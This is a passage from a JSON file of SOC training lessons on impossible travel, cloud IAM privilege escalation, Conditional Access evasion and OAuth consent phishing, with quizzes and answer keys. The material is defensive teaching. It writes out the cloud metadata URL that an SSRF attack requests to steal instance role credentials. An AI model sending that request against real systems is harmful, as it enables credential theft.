      "content": "Modern identity platforms do not just raise binary alarms; they assign a **risk level** using machine learning over many signals. In **Microsoft Entra ID Protection**, two related concepts drive this: **risky sign-ins** and **risky users**.\n\nA **risky sign-in** is a single authentication event scored as **low**, **medium**, or **high** risk based on detections like the ones above. A **risky user** is an account whose accumulated risk across sessions suggests the identity itself may be compromised. The distinction matters operationally: you might block one suspicious sign-in, or you might force a full password reset and revoke sessions for a user whose overall risk is high.\n\nEntra separates detections into **real-time** and **offline**. Real-time detections evaluate during the sign-in itself and can feed an immediate Conditional Access decision, such as demanding MFA or blocking. Offline detections, including impossible travel, are computed after the fact by correlating events, and they raise the user's risk state so policy can respond on the next sign-in. This is why impossible travel may appear in your console minutes after the actual logins.\n\nThe scoring engine folds in threat intelligence, known attack-IP feeds, and each tenant's own patterns. A sign-in from a data-centre IP range that hosts anonymisers weighs differently from a residential IP in the user's home city. The output is a probability-like judgement that a given event is malicious, expressed as the low/medium/high band analysts see.\n\nCrucially, these scores are **inputs to policy, not verdicts**. A high-risk sign-in does not automatically mean breach; it means the platform's model estimated elevated likelihood. The organisation decides what to do at each band through **Conditional Access** and risk policies, for example requiring MFA at medium risk and blocking at high. As an analyst, treat the risk level as a prioritisation aid that tells you where to look first, then apply human judgement and correlation before you conclude that an account is truly taken over."
    },
    {
      "heading": "False Positives, Investigation, and Response",
      "content": "Impossible travel is famously prone to **false positives**, and a good analyst expects them. Several benign situations mimic the pattern.\n\n- **VPNs and corporate proxies** make a user appear to originate from a distant city or country, so a login from home plus a VPN exit node abroad looks like impossible travel.\n- **Mobile roaming and carrier-grade NAT** can route a phone through IP space geolocated far from the user's real position, producing jumps between sessions.\n- **Cloud-to-cloud services** and mail clients that fetch on the user's behalf from data-centre IPs can appear as a second, distant actor.\n- **Stale geolocation databases** occasionally misplace an IP by thousands of kilometres.\n\nBecause of this, never treat an isolated impossible-travel alert as confirmed compromise. **Investigate by correlation.** Pull the user's sign-in logs and ask: are the two locations tied to known VPN or mobile ranges? Did the session use a compliant, familiar device? Were there companion signals such as an anonymous IP, atypical token, or a burst of denied MFA prompts? Did the account then perform sensitive actions, such as creating inbox forwarding rules, registering a new MFA method, or downloading large amounts of data? Those follow-on actions are the strongest confirmation of takeover.\n\nCheck the **User-Agent and application** too. A legitimate roaming user shows a consistent device and app; an attacker often uses a scripted client or an unusual mail protocol. Compare the flagged sign-in against the user's 30-day history for what \"normal\" looks like.\n\n**Response** scales with confidence. For a likely false positive, you may dismiss the risk and, if appropriate, add the VPN range to known trusted locations. For a probable takeover, act decisively: **revoke active sessions and refresh tokens**, force a **password reset**, require **re-registration of MFA** (attackers often add their own methods), and hunt for persistence such as malicious OAuth grants or mailbox rules. Document the timeline, the confirming signals, and the containment steps so the case supports both this incident and future detection tuning. The discipline is always the same: prioritise by risk score, confirm by correlation, then respond in proportion to what the evidence actually shows."
    }
  ],
  "keyTakeaways": [
    "Impossible travel and its companion signals (unfamiliar properties, anonymous/Tor IPs, atypical tokens, MFA fatigue) detect account takeover by behaviour rather than credentials, and are strongest when several fire on the same account at once.",
    "Isolated impossible-travel alerts are often false positives from VPNs, mobile roaming, or stale geo data, so analysts confirm by correlating with device, companion signals, and follow-on actions before revoking sessions and forcing a reset."
  ],
  "quiz": [
    {
      "question": "An account shows a sign-in from Tel Aviv at 09:00 and another from Frankfurt at 09:20, triggering an impossible-travel alert. Before escalating to account takeover, what is the most appropriate first investigative step?",
      "options": [
        {
          "label": "Immediately disable the account and force a password reset, since the geographic jump proves compromise.",
          "value": "a"
        },
        {
          "label": "Correlate the two sign-ins with device, IP type, and any companion risk signals to rule out VPN or roaming.",
          "value": "b"
        },
        {
          "label": "Ignore the alert entirely, because impossible-travel detections are always false positives from VPN use.",
          "value": "c"
        },
        {
          "label": "Add both Tel Aviv and Frankfurt to the trusted locations list so the alert stops firing in future.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Impossible travel is prone to false positives from VPNs and mobile roaming, so the right first move is to correlate the sign-ins with device, IP type, and companion signals before acting. Option a acts prematurely on an unconfirmed signal. Option c is wrong because the detection is meaningful and not always false; dismissing it blindly risks missing a real takeover. Option d suppresses evidence before understanding it, potentially blinding you to a genuine attack."
    },
    {
      "question": "In Microsoft Entra ID Protection, why does an impossible-travel detection sometimes appear in the console several minutes after the actual sign-ins occurred?",
      "options": [
        {
          "label": "Because it is an offline detection that correlates a pair of past events rather than evaluating one live sign-in.",
          "value": "a"
        },
        {
          "label": "Because the identity provider intentionally delays all alerts to reduce noise for the SOC team.",
          "value": "b"
        },
        {
          "label": "Because the user must manually approve the alert before it becomes visible to analysts.",
          "value": "c"
        },
        {
          "label": "Because impossible travel is only ever calculated once per day during a scheduled batch job.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Impossible travel is an offline detection: it needs to observe two sign-in events and compare their locations and times, so it surfaces after the fact rather than in real time. Option b is wrong because delays are due to correlation, not a blanket noise-reduction policy. Option c invents a user-approval step that does not exist. Option d is wrong because offline detections are computed as event pairs become available, not restricted to a single daily batch."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks",
    "https://learn.microsoft.com/en-us/entra/id-protection/overview-identity-protection",
    "https://attack.mitre.org/techniques/T1078/004/"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-cloud-iam-privilege-escalation",
  "slug": "cloud-iam-privilege-escalation",
  "title": "Cloud IAM and Privilege Escalation",
  "topic": "Cloud Security",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "In the cloud, identity is the perimeter. An attacker who lands with a low-privilege key rarely stops there; they look for a chain of misconfigurations that promotes them to administrator. This lesson covers the building blocks of cloud IAM, the shared-responsibility line, the classic privilege-escalation paths in AWS and Azure, and how a SOC analyst detects and defends against them using CloudTrail and Azure Activity logs.",
  "sections": [
    {
      "heading": "IAM Building Blocks and Shared Responsibility",
      "content": "**IAM** stands for **Identity and Access Management**: the system that decides who can do what to which cloud resource. Four concepts underpin it.\n\nA **user** (or service principal) is a persistent identity with credentials. A **role** is a set of permissions that an identity can **assume** temporarily rather than own permanently; in AWS you call `sts:AssumeRole` to receive short-lived credentials for that role. A **policy** is a JSON document listing allowed or denied **actions** (like `s3:GetObject`) on **resources**, and it is attached to users, groups, or roles. **Temporary credentials** are time-limited keys issued by the **Security Token Service** (STS in AWS, similar token services in Azure and GCP) so that workloads and federated users avoid long-lived secrets.\n\nRoles and temporary credentials are the healthy pattern: an EC2 instance or a Lambda function receives a role, and the cloud rotates its credentials automatically. The dangerous pattern is a long-lived **access key** stored in code or on disk, because a stolen key works until someone manually revokes it.\n\nThe **shared-responsibility model** draws the line between what the cloud provider secures and what the customer secures. The provider is responsible for security **of** the cloud, meaning the physical hardware, hypervisor, and managed-service infrastructure. The customer is responsible for security **in** the cloud, meaning their data, their configuration, and critically their **IAM policies**. Provider docs summarise this as the vendor securing the platform while you secure your identities, access, and data.\n\nThis line matters for the SOC. When an S3 bucket is exposed or an over-broad policy is abused, that is a customer-side failure that no provider control will catch for you; it must be caught in your logs and your configuration reviews. IAM is squarely on the customer side, so misconfigured permissions are one of the most common and most impactful cloud risks. Understanding these primitives is the prerequisite for spotting when an attacker turns a foothold into full control, which is what the next sections address."
    },
    {
      "heading": "Common Privilege-Escalation Paths",
      "content": "Once an attacker holds any valid cloud credential, they enumerate permissions and hunt for a path upward. Several recurring techniques appear across real incidents.\n\n**Over-permissive policies** are the simplest. A policy granting `iam:*` or, worse, wildcard `Action: *` on `Resource: *` lets the holder create new admin users, attach powerful policies to themselves, or edit policies directly. The attacker simply uses `iam:AttachUserPolicy` or `iam:PutUserPolicy` to grant themselves `AdministratorAccess`.\n\n**iam:PassRole abuse** is subtler and very common. Many services let you launch a resource that runs with a role you specify. If an identity can call `iam:PassRole` on a high-privilege role and also launch a service such as EC2, Lambda, or Glue, it can pass the powerful role to a resource it controls and then use that resource to act as the role. So a modest permission plus `PassRole` becomes admin.\n\n**Privilege via role assumption** works when a role's **trust policy** is too loose, allowing an unintended principal to assume it. The attacker calls `AssumeRole` and inherits that role's permissions.\n\n**Access-key theft** covers stolen long-lived keys found in source code, CI logs, laptops, or public repositories. Because the key carries whatever the user can do, theft of an admin's key is instant escalation with no further trickery.\n\n**Metadata-service SSRF** is a cloud-specific classic. Cloud instances expose a link-local **metadata endpoint** at `169.254.169.254` that returns the instance's role credentials. If a web app on that instance is vulnerable to **SSRF** (server-side request forgery), an attacker forces it to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and walks away with the instance role's temporary keys. **IMDSv2**, which requires a session token, was introduced specifically to blunt this attack; instances still on IMDSv1 remain exposed.\n\n| Path | Attacker action |\n|------|-----------------|\n| Over-permissive policy | Self-attach admin policy |\n| iam:PassRole | Pass powerful role to launched resource |\n| Loose trust policy | AssumeRole into higher privilege |\n| Access-key theft | Reuse stolen long-lived key |\n| Metadata SSRF | Steal instance role credentials |\n\nMost real escalations chain two or more of these, for example SSRF to grab a role, then `PassRole` to reach admin."
    },
    {
      "heading": "Detection with CloudTrail and Azure Activity",
      "content": "Every cloud API call is logged, and that log trail is the SOC analyst's primary weapon against IAM abuse. In AWS the source is **CloudTrail**; in Azure it is the **Azure Activity Log** and **Entra audit logs**; in GCP it is **Cloud Audit Logs**. Learn to read the management-plane events that accompany escalation.\n\nWatch for **IAM-mutating API calls** that rarely happen in normal operations: `CreateUser`, `CreateAccessKey`, `AttachUserPolicy`, `PutUserPolicy`, `CreateRole`, `UpdateAssumeRolePolicy`, and `CreatePolicyVersion`. A low-privilege identity suddenly attaching `AdministratorAccess` to itself is a screaming indicator. In Azure, the equivalent is a role assignment change such as adding a principal to **Owner** or **User Access Administrator**, visible in the Activity Log's administrative category.\n\n**New access keys** deserve special attention. `CreateAccessKey` on an account that already has keys, or key creation immediately followed by unfamiliar API activity from a new IP, often marks an attacker establishing durable access. Correlate the key's first-use source IP and User-Agent against the user's baseline.\n\n**Anomalous AssumeRole and PassRole** events matter too. Look for `AssumeRole` where the calling principal has never assumed that role before, or `RunInstances`/`CreateFunction` calls that pass an unusually powerful role. CloudTrail records the `requestParameters`, including the role ARN passed, so you can see exactly what was handed to the new resource.\n\n**Metadata-credential theft** shows up indirectly: the stolen credentials belong to an instance role, so you may see that role's temporary keys suddenly used from an **external IP** rather than from inside the instance. A role credential normally used only by a workload now calling APIs from an attacker's address is a strong SSRF-exfiltration signal.\n\nManaged detection services help. **AWS GuardDuty** raises findings such as credential exfiltration and anomalous IAM behaviour; **Microsoft Defender for Cloud** and **Entra ID Protection** raise similar identity alerts. Treat these as leads, then confirm in the raw audit trail. The analyst's mindset is to baseline what each identity normally does, then alert on deviations: a service account that only ever read from one bucket now enumerating IAM and creating users is behaving nothing like itself, and that behavioural gap is your detection."
    },
    {
      "heading": "Defence: Least Privilege and Guardrails",
      "content": "Detection catches attacks in progress; sound IAM design prevents most of them from succeeding at all. The defensive playbook centres on a few durable principles.\n\n**Least privilege** is the foundation. Grant each identity only the specific actions on the specific resources it needs, and prefer scoped resource ARNs over wildcards. Regularly review and prune permissions using access analysers and last-used data, because permissions accrete over time and unused grants are pure risk. Pay special attention to the sensitive actions that enable escalation, such as `iam:PassRole`, `iam:CreateAccessKey`, and policy-editing actions; restrict who can call them and on which roles.\n\n**Eliminate long-lived keys.** Replace static access keys with **roles and temporary credentials** wherever possible. For workloads, use instance or workload identities that the platform rotates automatically. For humans, use **federated single sign-on** with short-lived sessions rather than IAM users with permanent keys. If long-lived keys must exist, rotate them, scope them tightly, and monitor their use closely. Never commit keys to source control, and scan repositories and CI logs for leaked secrets.\n\n**Guardrails** enforce limits that individual policies cannot bypass. In AWS, **Service Control Policies** at the organisation level can deny dangerous actions across every account regardless of local permissions, for example forbidding disabling of CloudTrail. **Permission boundaries** cap the maximum privileges an identity can ever hold, so even a self-attached admin policy is constrained. Azure offers similar controls through management-group policy and **Privileged Identity Management** for just-in-time role activation.\n\nHarden the specific escalation paths. Enforce **IMDSv2** to defeat metadata SSRF, tighten **role trust policies** so only intended principals can assume each role, and require **MFA** for sensitive operations. Ensure the audit trail itself is protected: enable CloudTrail in all regions, deliver logs to a separate, access-restricted account, and alert on any attempt to stop or delete logging.\n\nFinally, close the loop between defence and detection. Every guardrail you add should have a matching alert for attempts to violate it, so the SOC learns when someone probes the boundary. Least privilege reduces the attack surface, no long-lived keys removes the easiest theft target, and guardrails ensure that even a mistake in one policy cannot become a full account takeover."
    }
  ],
  "keyTakeaways": [
    "Cloud privilege escalation chains misconfigurations like over-permissive policies, iam:PassRole abuse, loose role trust, stolen access keys, and metadata-service SSRF; IAM sits on the customer side of shared responsibility, so these failures are the SOC's to catch.",
    "Detection relies on management-plane logs (CloudTrail, Azure Activity, Entra audit) for anomalous IAM actions like self-attaching admin policies, new access keys, and role credentials used from external IPs; defence is least privilege, no long-lived keys, and guardrails such as SCPs, permission boundaries, and IMDSv2."
  ],
  "quiz": [
    {
      "question": "A web application running on an EC2 instance is vulnerable to SSRF. In CloudTrail you observe that the instance role's temporary credentials are suddenly making API calls from an external IP address the workload has never used. What has most likely happened?",
      "options": [
        {
          "label": "The provider's hypervisor was breached, which is the cloud vendor's responsibility under shared responsibility.",
          "value": "a"
        },
        {
          "label": "An attacker used SSRF to reach the metadata endpoint and stole the instance role's temporary credentials.",
          "value": "b"
        },
        {
          "label": "The instance rebooted, so its role credentials were automatically rotated to a new set of keys.",
          "value": "c"
        },
        {
          "label": "A legitimate developer copied the credentials to a laptop to debug the application locally.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "SSRF against the 169.254.169.254 metadata endpoint lets an attacker read the instance role's temporary credentials, which then appear used from an external IP, exactly the pattern described. Option a misassigns this to the provider; IAM and instance configuration are customer responsibilities. Option c is wrong because credential rotation does not cause use from an unfamiliar external IP. Option d is possible in theory but is prohibited practice and far less likely than SSRF given the stated vulnerability and the external-IP signal."
    },
    {
      "question": "Which combination of defences most directly reduces the risk that a modest identity can escalate to administrator through iam:PassRole and metadata-service theft?",
      "options": [
        {
          "label": "Enabling verbose application error pages and increasing the CloudTrail log retention period for audits.",
          "value": "a"
        },
        {
          "label": "Restricting iam:PassRole to specific roles and enforcing IMDSv2 on all instances to blunt metadata SSRF.",
          "value": "b"
        },
        {
          "label": "Granting broad wildcard permissions so fewer policies are needed and configuration stays simpler overall.",
          "value": "c"
        },
        {
          "label": "Rotating user passwords weekly and disabling multi-factor authentication to speed up developer logins.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Scoping iam:PassRole to specific roles removes the easy pass-to-powerful-role escalation, and enforcing IMDSv2 requires a session token that defeats simple metadata SSRF, directly addressing both named paths. Option a improves audit visibility but does not prevent either escalation and verbose errors can even aid attackers. Option c increases risk by widening permissions. Option d weakens security by removing MFA, making credential theft easier rather than harder."
    }
  ],
  "references": [
    "https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html",
    "https://attack.mitre.org/techniques/T1078/004/",
    "https://learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-conditional-access-risky-signins-entra",
  "slug": "conditional-access-risky-signins-entra",
  "title": "Conditional Access and Risky Sign-ins in Entra ID",
  "topic": "Microsoft Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Conditional Access is the policy engine at the heart of Microsoft Entra ID, deciding for every sign-in whether to allow, block, or demand stronger proof of identity. Paired with Identity Protection's risk scoring, it turns a static password check into a dynamic, signal-driven decision. This lesson explains how Conditional Access works, how risky users and sign-ins feed it, how attackers try to evade it, and what the SOC analyst sees in the sign-in logs.",
  "sections": [
    {
      "heading": "How Conditional Access Works",
      "content": "**Microsoft Entra ID** is Microsoft's cloud identity provider, formerly called Azure Active Directory. **Conditional Access** is its policy engine, and it operates on a simple mental model: **signals lead to conditions lead to access controls**. Every authentication is evaluated against your policies before access is granted.\n\n**Signals** are facts about the sign-in: which user, which group, what application they are reaching, the device and its compliance state, the location or IP, the client app type, and the calculated **risk level**. **Conditions** are the tests a policy applies to those signals, for example \"user is in the Finance group AND the app is Exchange Online AND the location is outside the corporate network.\" When the conditions match, the policy applies its **access controls**, which fall into two kinds.\n\n**Grant controls** decide whether and how to allow the sign-in: block access entirely, or grant it but require one or more conditions such as **multi-factor authentication (MFA)**, a **compliant device**, a **hybrid-joined device**, or an approved client app. **Session controls** shape what happens after access, such as limiting session lifetime or restricting downloads.\n\nA useful way to read a policy is as an if-then statement: **if** these signals and conditions are present, **then** apply these controls. A common baseline policy reads: if any user signs in to any cloud app from outside trusted locations, then require MFA. A stricter one: if a high-risk sign-in is detected, then block or force a secure password change.\n\nPolicies are additive and evaluated together; all applicable policies must be satisfied. Because a misconfigured policy can lock out administrators or, conversely, leave a gap, Entra provides **report-only mode** to observe a policy's effect before enforcing it, and recommends emergency **break-glass accounts** excluded from policies. For the SOC, understanding this signals-conditions-controls flow is what lets you explain why a given sign-in was challenged, allowed, or blocked when you read its log entry."
    },
    {
      "heading": "Identity Protection: Risky Users and Sign-ins",
      "content": "Conditional Access becomes far more powerful when it consumes risk from **Microsoft Entra ID Protection**. Identity Protection uses machine learning and Microsoft's threat intelligence to score two distinct things.\n\nA **risky sign-in** rates the likelihood that a specific authentication event was performed by someone other than the legitimate user, banded as **low**, **medium**, or **high** risk. Its detections include familiar signals: anonymous IP address, atypical travel (impossible travel), unfamiliar sign-in properties, malicious IP address, password spray, and token anomalies.\n\nA **risky user** rates the likelihood that the account itself is compromised, accumulating from sign-in risk over time plus signals such as leaked credentials found in breach dumps. The two are complementary: you might challenge one risky sign-in, but a persistently risky user warrants a full remediation.\n\nDetections are either **real-time** or **offline**. Real-time detections resolve during the sign-in and can drive an immediate Conditional Access decision. Offline detections, such as impossible travel, are computed shortly afterward and raise the user's risk state for the next evaluation.\n\nConditional Access consumes these scores through **risk-based policies**. Two are foundational:\n\n- **Sign-in risk policy**: if sign-in risk is medium or high, require MFA (or block).\n- **User risk policy**: if user risk is high, require a secure password change, which also revokes existing sessions.\n\nThis closes a loop. Identity Protection detects a risky sign-in, Conditional Access reacts in the moment by demanding MFA, and if the user successfully completes MFA the risk can be automatically remediated and the sign-in allowed; if they cannot, access is denied. The result is a system that raises friction precisely when risk is elevated and stays invisible when it is not.\n\nFor an analyst, the practical payoff is prioritisation. The risk band tells you which sign-ins to review first, the risky-user view tells you which accounts may need forced resets, and the remediation state tells you whether the platform already handled the event or is waiting for human action."
    },
    {
      "heading": "How Attackers Try to Evade It",
      "content": "Attackers know Conditional Access stands between them and the mailbox or data they want, so they probe for gaps rather than attacking MFA head-on.\n\n**Legacy authentication** is the classic bypass. Older protocols such as **IMAP**, **POP3**, **SMTP AUTH**, and legacy Exchange endpoints predate modern authentication and **cannot perform MFA or honour Conditional Access grant controls** the way modern auth does. If a tenant still permits legacy auth, an attacker who has a valid password can authenticate through it and sidestep the MFA requirement entirely. This is why Microsoft's strong recommendation, and a standard hardening step, is a Conditional Access policy that **blocks legacy authentication** outright. Password-spray campaigns disproportionately target legacy endpoints for exactly this reason.\n\n**Token theft and replay** is the more modern evasion. Instead of stealing a password, the attacker steals an already-issued **session token** or **refresh token**, often via **adversary-in-the-middle (AiTM)** phishing that proxies the real login page and captures the post-MFA token. Replaying that token can grant access without re-triggering MFA, because from the service's view the user already authenticated. Microsoft counters this with detections for **token anomalies**, **continuous access evaluation**, and controls that bind tokens to compliant devices, but the technique remains a live threat and maps to MITRE ATT&CK's steal-or-forge-authentication-tokens behaviour.\n\nOther evasions include **consent phishing** to obtain OAuth tokens (covered in its own lesson), abusing **trusted-location** gaps by routing through an allowed IP range, and targeting accounts or apps mistakenly **excluded** from policies. Policy exclusions, meant for break-glass accounts, become a liability if an attacker discovers an over-broad exclusion.\n\nThe defensive lesson for the SOC is twofold. First, ensure the obvious doors are shut: block legacy auth, minimise exclusions, and require compliant devices for sensitive apps. Second, hunt for the subtle evasions: a successful sign-in that never shows an MFA challenge for an app that should require one, a legacy-protocol authentication that succeeded, or a token used from a device and IP that do not match where it was issued. These anomalies are how evasion reveals itself in the logs you monitor."
    },
    {
      "heading": "What the Analyst Sees and How to Respond",
      "content": "The **Entra sign-in logs** are where all of this becomes concrete for the SOC. Each sign-in entry records the user, application, timestamp, source IP and location, device and its compliance state, the **client app** (which reveals modern versus legacy auth), the **conditional access** result showing which policies applied and whether they succeeded or failed, the **authentication requirement** (single-factor or MFA), the **risk level and risk state**, and the final **status** with any error code.\n\nRead these fields together to reconstruct the story. A healthy blocked attack looks like: high risk detected, Conditional Access policy applied, MFA required, MFA not satisfied, sign-in failed. That is the system working. The entries that demand attention are the mismatches.\n\nHunt for these patterns:\n\n- A **successful sign-in with client app = legacy** for a user or app that should be covered by MFA. Legacy auth succeeding is a red flag that a bypass path is open.\n- A **high-risk sign-in that still shows success** with only single-factor authentication, indicating a policy gap or an excluded account.\n- A sign-in where **Conditional Access = not applied** on a sensitive app, suggesting the policy scope missed it.\n- **Token or session** anomalies: a session reused from a new IP or device shortly after an AiTM-style phishing event.\n- A **risky user** who then performs sensitive actions such as registering a new MFA method or creating inbox forwarding rules.\n\n**Response** follows the evidence. For a confirmed risky account, use Identity Protection to **confirm the user as compromised**, which sharpens the model, then **force a secure password reset**, **revoke sessions and refresh tokens**, and require **re-registration of MFA** since attackers often add their own authenticator. Review the account's OAuth grants and mailbox rules for persistence. If a policy gap allowed the attack, feed that back into engineering: tighten the policy scope, remove the offending exclusion, or block the legacy protocol.\n\nThe overarching analyst skill is to treat the sign-in log as a narrative of the policy engine's decisions. When the story reads cleanly, the controls worked; when a step is missing, an MFA that should have fired did not, a legacy path succeeded, a risky sign-in slipped through, you have found either an attack or the gap that an attacker will use next."
    }
  ],
  "keyTakeaways": [
    "Conditional Access evaluates signals against conditions to apply access controls (block, or require MFA/compliant device), and it consumes Identity Protection's risky-sign-in and risky-user scores through sign-in-risk and user-risk policies to react dynamically to threat.",
    "Attackers evade it mainly via legacy authentication (which cannot honour MFA) and token theft/replay from AiTM phishing; analysts hunt the sign-in logs for successful legacy auth, high-risk successes with single factor, and Conditional Access not being applied to sensitive apps."
  ],
  "quiz": [
    {
      "question": "In the Entra sign-in logs you find a successful authentication to Exchange where the client app is a legacy protocol (IMAP), the user completed only single-factor authentication, and Conditional Access shows as not applied. Why is this concerning?",
      "options": [
        {
          "label": "Legacy protocols like IMAP cannot honour MFA grant controls, so the attacker bypassed the MFA requirement.",
          "value": "a"
        },
        {
          "label": "The sign-in used a compliant device, which always guarantees the account is safe from compromise.",
          "value": "b"
        },
        {
          "label": "IMAP sign-ins are automatically blocked by Entra, so this log entry must be a false record.",
          "value": "c"
        },
        {
          "label": "Single-factor authentication over IMAP still triggers the same risk scoring as modern auth flows.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Legacy authentication protocols such as IMAP predate modern auth and cannot perform MFA or honour Conditional Access grant controls, so a successful legacy sign-in with only single factor means the MFA requirement was bypassed. Option b is wrong and misleading; the entry does not indicate a compliant device and compliance never guarantees safety. Option c is false because Entra does not auto-block legacy auth unless a policy is configured to do so. Option d overstates legacy auth's risk visibility, which is precisely why blocking it is recommended."
    },
    {
      "question": "How does a risk-based Conditional Access sign-in policy typically respond when Identity Protection scores a sign-in as medium or high risk, assuming the user has MFA registered?",
      "options": [
        {
          "label": "It silently allows the sign-in and only records the risk level for later manual review by an analyst.",
          "value": "a"
        },
        {
          "label": "It permanently disables the user account and requires an administrator to manually re-enable it.",
          "value": "b"
        },
        {
          "label": "It requires MFA in the moment, and a successful challenge can automatically remediate the sign-in risk.",
          "value": "c"
        },
        {
          "label": "It reroutes the sign-in to a legacy authentication endpoint so the user can bypass the challenge.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "A sign-in-risk policy typically requires MFA when risk is medium or high; if the user successfully completes MFA, the risk can be automatically remediated and access granted, raising friction only when needed. Option a is wrong because the whole point is to act in the moment, not just log. Option b is too extreme and describes neither the sign-in-risk nor user-risk policy behaviour. Option d is nonsensical and dangerous, as legacy endpoints are what such policies aim to eliminate."
    }
  ],
  "references": [
    "https://learn.microsoft.com/en-us/entra/identity/conditional-access/overview",
    "https://learn.microsoft.com/en-us/entra/id-protection/concept-identity-protection-risks",
    "https://attack.mitre.org/techniques/T1550/"
  ],
  "xp": 210,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-oauth-consent-phishing",
  "slug": "oauth-consent-phishing",
  "title": "OAuth Consent Phishing (Illicit Consent Grants)",
  "topic": "Email Security",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Not every account takeover involves stealing a password. In OAuth consent phishing, the victim is tricked into clicking Accept on a legitimate-looking permission screen, granting a malicious application ongoing access to their mailbox and data. Because no password changes hands, the access survives password resets and even MFA. This lesson, mapped to MITRE ATT&CK technique T1528, explains how the attack works, why it is so dangerous, and how a SOC analyst detects and defends against it.",
  "sections": [
    {
      "heading": "What OAuth Consent Phishing Is",
      "content": "**OAuth** is the open standard that lets you grant one application access to your data in another service without sharing your password. When you click \"Sign in with Microsoft\" or authorise an app to read your calendar, you are using OAuth. The app receives a **token** scoped to specific **permissions** (also called scopes), and the service enforces those limits.\n\n**OAuth consent phishing**, also known as an **illicit consent grant** attack, abuses this legitimate mechanism. Instead of stealing credentials, the attacker registers a malicious **OAuth application** and lures the victim to its consent screen. The victim sees a normal Microsoft or Google permission prompt, often for an app with a benign-sounding name, and clicks **Accept**. In doing so they grant the attacker's app the permissions it requested against **their own account**. MITRE ATT&CK catalogues this as technique **T1528, Steal Application Access Token**, within the broader consent-abuse pattern.\n\nThe crucial insight is that **the victim's password is never involved**. The user authenticated normally to their own identity provider; what they got wrong was approving an untrustworthy third party. The attacker never sees the password and never needs to. From the identity provider's perspective, the user made a valid, authenticated choice to delegate access.\n\nThe permissions the attacker requests are deliberately chosen for durability and reach. Common ones include:\n\n- **offline_access**, which grants a **refresh token** so the app can keep obtaining new access tokens indefinitely without the user present.\n- **Mail.Read** or **Mail.ReadWrite**, granting read or write access to the entire mailbox.\n- **Files.Read.All**, **User.Read**, and contact or calendar scopes to expand reach.\n\nWith `offline_access` plus `Mail.Read`, the attacker's application can silently read the victim's email around the clock. The whole attack can look, to the user, like nothing more than authorising a productivity add-in. That ordinariness is what makes consent phishing effective and why it deserves a distinct detection strategy separate from credential theft."
    },
    {
      "heading": "How the Attack Works Step by Step",
      "content": "The attack follows a repeatable sequence, and understanding each stage tells the analyst where to look.\n\n**Step 1: Register a malicious app.** The attacker creates an OAuth application in their own tenant or a throwaway one, configuring it to request the scopes they want, such as `offline_access`, `Mail.Read`, and `Files.Read.All`. They give it a plausible name, sometimes impersonating a known brand or a generic tool like \"Office365 Mail Backup.\"\n\n**Step 2: Craft the lure.** The attacker sends a phishing email or message containing a link to the identity provider's **legitimate** consent URL, with the malicious app's client ID embedded. Because the link points to a genuine Microsoft or Google domain, it passes many URL-reputation checks and looks trustworthy. This is a key difference from classic credential phishing, where the fake login page lives on an attacker domain.\n\n**Step 3: Victim consents.** The victim clicks, authenticates to their real provider (satisfying any MFA), and is shown the consent screen listing the requested permissions. Many users click **Accept** without scrutinising the scopes, especially if the app name looks routine. At this moment the provider issues the app an **access token** and, thanks to `offline_access`, a **refresh token**.\n\n**Step 4: Attacker uses the token.** The malicious app now calls the provider's API, for example Microsoft Graph, to read mail, download files, or harvest contacts, using the tokens rather than any password. The traffic originates from the app's infrastructure and is authorised, so it does not look like a suspicious login.\n\n**Step 5: Persist and act on objectives.** The refresh token lets the attacker maintain access over time. They may set up mailbox forwarding, search for sensitive data, or use the mailbox for **business email compromise** to phish the victim's contacts from a trusted account.\n\n| Stage | Attacker action | Analyst artefact |\n|-------|-----------------|------------------|\n| Register | Create app, request scopes | New app registration |\n| Lure | Send link to real consent URL | Phishing email |\n| Consent | Victim clicks Accept | \"Consent to application\" audit event |\n| Use | Call Graph API with token | OAuth app data access |\n| Persist | Reuse refresh token | Ongoing app activity |\n\nEach stage leaves a trace, and the consent event in Step 3 is the pivotal one for detection."
    },
    {
      "heading": "Why It Is So Dangerous",
      "content": "OAuth consent phishing is dangerous precisely because it sidesteps the defences organisations trust most, and it hides inside legitimate machinery.\n\nFirst, **it survives password resets**. In a credential-theft incident, forcing the victim to change their password cuts off the attacker. Here the attacker never had the password; they hold a **refresh token** tied to a consented app. Resetting the password does nothing to that grant. The standard first-response reflex fails, and if the analyst does not know to revoke the consent, access continues.\n\nSecond, **it survives MFA**. Multi-factor authentication protects the sign-in. But the victim already completed MFA when they authenticated to their real provider before consenting. The token the attacker holds represents an already-MFA'd session's delegated access, so re-prompting for MFA never occurs for the app's background API calls. MFA, the control most organisations lean on hardest, provides no protection once consent is granted.\n\nThird, **it blends into normal traffic**. The malicious app calls the same APIs that legitimate add-ins use, from cloud infrastructure, with valid tokens. There is no failed-login spike, no impossible travel, no brute force. Behavioural sign-in detections that catch credential attacks may see nothing, because from the identity layer's view nothing anomalous is happening.\n\nFourth, **the phishing link is trustworthy on its face**. The lure points to the provider's real consent endpoint on a genuine domain, so URL filtering and user \"check the domain\" training often pass it. The user is not fooled about the domain; they are fooled about the app.\n\nFinally, the **access is broad and persistent**. With mailbox read/write and file scopes, the attacker can exfiltrate data continuously and pivot to **business email compromise**, sending internal phishing from a genuinely trusted account. Because the mailbox belongs to a real, respected colleague, downstream victims are far more likely to comply.\n\nTaken together, these properties make consent phishing a quiet, durable compromise that defeats the password-and-MFA 